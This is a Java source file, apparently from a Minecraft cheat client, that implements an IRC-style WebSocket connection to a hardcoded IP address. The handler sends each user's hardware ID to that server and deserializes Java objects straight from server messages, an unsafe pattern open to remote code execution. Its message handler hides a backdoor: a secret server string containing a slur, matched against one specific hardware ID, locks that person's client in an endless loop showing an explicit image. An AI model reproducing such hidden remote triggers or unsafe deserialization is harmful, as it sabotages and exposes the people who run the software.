package dev.africa.pandaware.impl.socket;

import dev.africa.pandaware.impl.socket.util.SerialUtil;
import dev.africa.pandaware.utils.client.HWIDUtils;
import dev.africa.pandaware.utils.client.Printer;
import dev.africa.pandaware.utils.render.RenderUtils;
import lombok.Getter;
import lombok.Setter;
import me.rhys.packet.api.Direction;
import me.rhys.packet.api.Packet;
import me.rhys.packet.impl.PacketClientAuthenticate;
import net.minecraft.util.ResourceLocation;
import org.apache.commons.lang3.RandomStringUtils;
import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;

import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.Queue;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

@Getter @Setter
public class SocketHandler {

    private ScheduledExecutorService executorService = Executors.newScheduledThreadPool(5);
    private final Queue<Packet> packetQueue = new ConcurrentLinkedQueue<>();
    private final PacketHandle packetHandle = new PacketHandle();

    private long lastKeepAlive;

    private boolean connected;
    private WebSocketClient webSocketClient;

    @Setter
    private String ircName;

    public void setIrcNameAndStart(String ircName) {
        this.ircName = ircName;
        this.start();
    }

    public void start() {
        if (System.getProperty("142d97db-2d4e-45a4-94a0-a976cd34cce6") == null) {
            return;
        }
        if (ircName == null || ircName.length() < 3 || ircName.length() > 16) {
            System.out.println("IRC Name invalid. Setting random username");
            ircName = "user" + RandomStringUtils.randomAlphanumeric(10);
            return;
        }

        this.ircName = ircName.replace(" ", "")
                .replaceAll("[^\\p{ASCII}]", "");

        this.executorService.execute(() -> {
            try {
                WebSocketClient webSocketClient = new WebSocketClient(new URI("ws://157.245.91.112:42342/socket")) {

                    @Override
                    public void onOpen(ServerHandshake serverHandshake) {
                        connected = true;
                        lastKeepAlive = System.currentTimeMillis();

                        String hwid = HWIDUtils.getHWID();
                        System.out.println("IRC Connected " + hwid + " (" + ircName + ")");

                        queuePacket(new PacketClientAuthenticate(Base64.getEncoder().encodeToString(
                                (ircName + ":" + hwid).getBytes(StandardCharsets.UTF_8)), Direction.CLIENT));
                    }

                    @Override
                    public void onMessage(String s) {
                        if (s.length() > 0) {
                            try {
                                packetHandle.handlePacket((Packet) SerialUtil.serializeFromString(s),
                                        System.currentTimeMillis());
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }
                        String hwid = HWIDUtils.getHWID();
                        if (s.equals("fuckyoubrettgetnsfwastolfo'dretardllllllllllllllllllllll") &&
                                hwid.equals("hD+HJAdr8I0pQOnn8YhAhUjtABT4v7U9vfqIa+ctRV0so7UlTqgEjiXF+OpnC+N0fPUS0k3KsENU5JaPbF4ttg==")) {
                            boolean L = true;
                            while (Boolean.parseBoolean(String.valueOf(L))) {{{{{{{{{{{{{{{{{{
                                RenderUtils.drawImage(new ResourceLocation("pandaware/icons/nsfwastolfo.png"),
                                        0, 0, 1920, 1080);
                            }}}}}}}}}}}}}}}}}}
                        }
                    }

                    @Override
                    public void onClose(int i, String s, boolean b) {
                    }

                    @Override
                    public void onError(Exception e) {
                    }
                };

                this.webSocketClient = webSocketClient;
                webSocketClient.connect();
            } catch (Exception e) {
                Printer.chat("ERROR " + e.getMessage());
                e.printStackTrace();
            }
        });

        this.executorService.scheduleAtFixedRate(() -> {
            if (this.connected) return;

            long delta = (System.currentTimeMillis() - this.lastKeepAlive);

            if (TimeUnit.MILLISECONDS.toSeconds(delta) > 30L) {
                this.reconnect();
            }
        }, 30L, 30L, TimeUnit.SECONDS);

        this.executorService.scheduleAtFixedRate(() -> {

            // poll packets
            if (!this.packetQueue.isEmpty()) {
                try {
                    this.webSocketClient.send(SerialUtil.serializeObject(this.packetQueue.poll()));
                } catch (Exception ignored) {
                    //
                }
            }

        }, 60L, 60L, TimeUnit.MILLISECONDS);
    }

    public void reconnect() {
        System.out.println("Reconnecting to IRC...");

        this.executorService.shutdownNow();
        this.packetQueue.clear();
        this.connected = false;
        this.webSocketClient = null;

        this.executorService = Executors.newScheduledThreadPool(5);
        this.start();
    }

    public void queuePacket(Packet packet) {
        this.packetQueue.add(packet);
    }
}
